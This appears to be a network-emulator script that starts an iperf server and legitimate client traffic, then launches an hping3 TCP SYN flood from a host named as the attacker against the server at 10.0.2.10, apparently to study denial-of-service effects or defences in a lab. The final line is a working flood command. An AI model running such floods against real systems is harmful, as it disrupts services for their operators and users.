h_web1 iperf -s -p 80 &
sh sleep 2
h_ext1 iperf -c 10.0.2.10 -p 80 -t 300 &
sh sleep 5
h_att1 hping3 -S -p 80 --flood 10.0.2.10
